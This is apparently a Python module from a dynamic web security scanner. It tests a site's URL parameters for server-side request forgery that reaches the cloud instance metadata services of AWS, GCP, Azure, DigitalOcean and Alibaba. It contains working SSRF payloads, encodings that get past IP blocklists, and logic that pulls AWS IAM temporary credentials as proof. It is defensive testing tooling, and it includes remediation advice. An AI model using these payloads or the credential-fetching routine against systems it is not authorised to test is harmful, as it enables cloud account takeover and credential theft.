"""SSRF to cloud instance metadata — turn a request-forgery sink into cloud-credential theft.

The highest-impact SSRF payoff: point the sink at the link-local metadata service and read back
IAM/instance data in-band. Endpoints by provider: AWS/Azure/DigitalOcean use ``169.254.169.254``,
Alibaba ``100.100.100.200``, GCP ``metadata.google.internal``. Confirmation requires a **strong
metadata signature** in the response (specific keys like ``ami-id`` / ``AccessKeyId`` / ``azEnvironment``),
never a mere echo of the injected URL — so it's zero-FP: those keys only appear if the server actually
fetched the metadata service. On AWS it escalates: the IAM role at ``.../security-credentials/`` is
fetched to surface the real temporary ``AccessKeyId`` as proof (the secret is masked in evidence).

Runs over every discovered request's URL-ish injection points, so it covers the whole surface.
"""

from __future__ import annotations

import re
from dataclasses import dataclass
from urllib.parse import urlsplit

import httpx

from dastcore.core.http_client import BudgetExceededError, HttpClient, OutOfScopeError
from dastcore.core.models import Evidence, Finding, HttpResponse, InjectionPoint
from dastcore.engine.injection_points import extract_injection_points
from dastcore.engine.rule_engine import build_mutated_request

# Parameter names that commonly hold a URL the server will fetch (SSRF sinks).
_SINK_NAMES = frozenset({
    "url", "uri", "link", "redirect", "redirect_uri", "redirecturl", "redirect_url", "callback",
    "callback_url", "webhook", "fetch", "proxy", "dest", "destination", "target", "u", "next",
    "continue", "return", "returnurl", "returnto", "return_to", "goto", "out", "view", "load", "image",
    "img", "imageurl", "image_url", "avatar", "file", "path", "page", "feed", "rss", "host", "domain",
    "site", "website", "source", "src", "ref", "reference", "endpoint", "api", "remote", "to", "from",
    "forward", "open", "upstream", "origin",
})
_URLISH = re.compile(r"^\s*(?:https?:)?//", re.IGNORECASE)


def _ipv4_encodings(ip: str) -> list[str]:
    """Alternate textual encodings of a dotted IPv4 that a lax URL parser / OS resolver still routes to
    the same address — used to slip past filters that blocklist the *literal* link-local string
    (e.g. ``169.254.169.254``). The metadata oracle still requires a real metadata signature in the
    response, so a variant that doesn't actually reach the service simply yields nothing (zero-FP)."""
    try:
        octets = [int(x) for x in ip.split(".")]
    except ValueError:
        return []
    if len(octets) != 4 or any(o < 0 or o > 255 for o in octets):
        return []
    packed = (octets[0] << 24) | (octets[1] << 16) | (octets[2] << 8) | octets[3]
    return [
        str(packed),                                        # decimal:      2852039166
        hex(packed),                                        # hex:          0xa9fea9fe
        ".".join(hex(o) for o in octets),                   # dotted hex:   0xa9.0xfe.0xa9.0xfe
        ".".join(f"0{o:o}" for o in octets),                # dotted octal: 0251.0376.0251.0376
        ip + ".",                                           # trailing dot: 169.254.169.254.
        f"[::ffff:{octets[0]:02x}{octets[1]:02x}:{octets[2]:02x}{octets[3]:02x}]",  # IPv6-mapped
    ]


def _rewrite_host(url: str, new_host: str) -> str:
    """Return ``url`` with its authority replaced by ``new_host`` (keeps scheme/path/query)."""
    return urlsplit(url)._replace(netloc=new_host).geturl()


@dataclass
class _Probe:
    cloud: str
    url: str
    signature: re.Pattern[str]
    min_hits: int = 1  # distinct signature keys required (guards against a coincidental single word)


# Ordered probes. Signatures are intentionally specific to the metadata payloads.
_PROBES: list[_Probe] = [
    _Probe("AWS", "http://169.254.169.254/latest/meta-data/",
           re.compile(r"\b(ami-id|instance-id|instance-type|local-ipv4|public-ipv4|iam|placement|"
                      r"security-groups|hostname|mac|reservation-id)\b", re.IGNORECASE), min_hits=2),
    _Probe("AWS", "http://169.254.169.254/latest/dynamic/instance-identity/document",
           re.compile(r'"(accountId|instanceId|region|imageId|privateIp|architecture)"'), min_hits=2),
    _Probe("GCP", "http://metadata.google.internal/computeMetadata/v1/instance/",
           re.compile(r"(computeMetadata|Metadata-Flavor|service-accounts|numeric-project-id)", re.IGNORECASE),
           min_hits=1),
    _Probe("Azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
           re.compile(r'"(azEnvironment|vmId|subscriptionId|resourceGroupName|osType)"'), min_hits=1),
    _Probe("DigitalOcean", "http://169.254.169.254/metadata/v1.json",
           re.compile(r'"(droplet_id|floating_ip|region|public_keys)"'), min_hits=1),
    _Probe("Alibaba", "http://100.100.100.200/latest/meta-data/",
           re.compile(r"\b(instance-id|region-id|zone-id|private-ipv4|image-id)\b", re.IGNORECASE), min_hits=2),
]

_AWS_ROLES_URL = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
_AWS_ROLE_RE = re.compile(r"[A-Za-z0-9+=,.@_-]{1,128}")
_AWS_CRED_RE = re.compile(r'"(AccessKeyId|SecretAccessKey|Token|Expiration)"')
_AWS_KEY_RE = re.compile(r'"AccessKeyId"\s*:\s*"(A[A-Z0-9]{15,})"')

# When every literal probe is blocked on a sink, retry these with alternate IP encodings (see
# _ipv4_encodings) — this is the classic SSRF filter bypass. (probe, dotted-IPv4 to re-encode).
_BYPASS_TARGETS: list[tuple[int, str]] = [(0, "169.254.169.254"), (5, "100.100.100.200")]


def _is_ssrf_sink(point: InjectionPoint) -> bool:
    return point.name.lower() in _SINK_NAMES or bool(_URLISH.match(point.base_value or ""))


async def _send(client: HttpClient, request) -> HttpResponse | None:
    try:
        return await client.request(
            request.method, request.url,
            params=request.params or None, headers=request.headers or None,
            cookies=request.cookies or None, data=request.data, json=request.json_body,
            timeout=8.0, retries=0,
        )
    except (OutOfScopeError, BudgetExceededError, httpx.HTTPError):
        return None


def _hits(pattern: re.Pattern[str], text: str, *, strip: str = "") -> set[str]:
    """Distinct signature matches in ``text`` — after removing ``strip`` (the injected URL), so a sink
    that merely *echoes* the metadata URL (which itself contains words like 'computeMetadata') can't
    manufacture a signature. Only content the server actually *fetched* survives."""
    if strip:
        text = text.replace(strip, "")
    return {m.group(0).lower() for m in pattern.finditer(text)}


async def _aws_credential_proof(
    client: HttpClient, point: InjectionPoint, roles_url: str = _AWS_ROLES_URL
) -> str | None:
    """If the AWS IAM roles endpoint is reachable via the sink, fetch the role's creds as proof.
    ``roles_url`` may carry an alternate host encoding when the literal IP was filter-bypassed."""
    roles_resp = await _send(client, build_mutated_request(point, roles_url))
    if roles_resp is None or roles_resp.status_code >= 400:
        return None
    role = (roles_resp.text or "").strip().splitlines()[0].strip() if roles_resp.text.strip() else ""
    if not role or not _AWS_ROLE_RE.fullmatch(role):
        return None
    cred_resp = await _send(client, build_mutated_request(point, roles_url + role))
    if cred_resp is None or len(_hits(_AWS_CRED_RE, cred_resp.text)) < 2:
        return None
    key_match = _AWS_KEY_RE.search(cred_resp.text)
    key_hint = f"{key_match.group(1)[:8]}…(masked)" if key_match else "present"
    return f"IAM role '{role}' temporary credentials returned (AccessKeyId {key_hint}, SecretAccessKey masked)"


def _finding(
    point: InjectionPoint, probe: _Probe, resp: HttpResponse, *,
    proof: str | None, used_url: str | None = None, bypass: str | None = None,
) -> Finding:
    path = urlsplit(point.request_template.url).path or "/"
    used_url = used_url or probe.url
    critical = proof is not None
    bypass_note = f" (evadiendo el filtro de IP con la codificación '{bypass}')" if bypass else ""
    detail = proof or f"{probe.cloud} metadata returned for {used_url}{bypass_note} (keys matched in the response)"
    return Finding(
        id=f"ssrf-cloud-metadata:{probe.cloud.lower()}:{point.request_template.method}:{path}:{point.name}",
        rule_id="ssrf-cloud-metadata",
        name=f"SSRF to {probe.cloud} cloud metadata"
             + (" — IAM credentials exposed" if critical else ""),
        severity="critical" if critical else "high",
        cwe="CWE-918",
        owasp="WSTG-INPV-19",
        cvss="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N" if critical
        else "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
        family="ssrf",
        injection_point=InjectionPoint(location=point.location, name=point.name, base_value=point.base_value,
                                       request_template=point.request_template),
        evidence=[Evidence(
            type="differential",
            data=(f"Injecting {used_url} into '{point.name}' made the server fetch the cloud metadata "
                  f"service and return it: {detail}")[:300],
            confidence="high",
        )],
        request=build_mutated_request(point, used_url),
        response=resp,
        remediation=(
            "No hagas fetch de URLs controladas por el usuario. Valida contra una allowlist estricta de "
            "host y esquema, re-resuelve y fija el destino, y **bloquea el rango link-local y las IP "
            "internas** (169.254.169.254, 100.100.100.200, metadata.google.internal, RFC1918). En AWS, "
            "exige **IMDSv2** (HttpTokens=required) y baja el hop-limit; aplica roles IAM de mínimo privilegio."
        ),
    )


async def _bypass_pass(client: HttpClient, point: InjectionPoint) -> Finding | None:
    """Every literal metadata probe was blocked on this sink — retry the IP-based endpoints with
    alternate host encodings to defeat a blocklist filter. Still content-gated, so still zero-FP."""
    for probe_idx, ip in _BYPASS_TARGETS:
        probe = _PROBES[probe_idx]
        for enc in _ipv4_encodings(ip):
            used_url = _rewrite_host(probe.url, enc)
            resp = await _send(client, build_mutated_request(point, used_url))
            if resp is None:
                continue
            if len(_hits(probe.signature, resp.text, strip=used_url)) >= probe.min_hits:
                proof = None
                if probe.cloud == "AWS":
                    proof = await _aws_credential_proof(client, point, _rewrite_host(_AWS_ROLES_URL, enc))
                return _finding(point, probe, resp, proof=proof, used_url=used_url, bypass=enc)
    return None


async def run_cloud_ssrf_checks(
    client: HttpClient, requests: list, *, max_points: int = 40, max_bypass_points: int = 15
) -> list[Finding]:
    """Probe URL-ish injection points for SSRF that reaches a cloud metadata service (A10 / CWE-918)."""
    seen: set[str] = set()
    candidates: list[InjectionPoint] = []
    for req in requests:
        for point in extract_injection_points(req, include_headers=False):
            if not _is_ssrf_sink(point):
                continue
            key = f"{req.method} {urlsplit(req.url).path} {point.location}:{point.name}"
            if key not in seen:
                seen.add(key)
                candidates.append(point)

    findings: list[Finding] = []
    for idx, point in enumerate(candidates[:max_points]):
        found = False
        for probe in _PROBES:
            resp = await _send(client, build_mutated_request(point, probe.url))
            if resp is None:
                continue
            if len(_hits(probe.signature, resp.text, strip=probe.url)) >= probe.min_hits:
                proof = await _aws_credential_proof(client, point) if probe.cloud == "AWS" else None
                findings.append(_finding(point, probe, resp, proof=proof))
                found = True
                break  # one finding per sink point
        # Literal probes blocked but this is a real URL sink: try filter-bypass encodings (bounded).
        if not found and idx < max_bypass_points:
            bypass = await _bypass_pass(client, point)
            if bypass is not None:
                findings.append(bypass)
    return findings
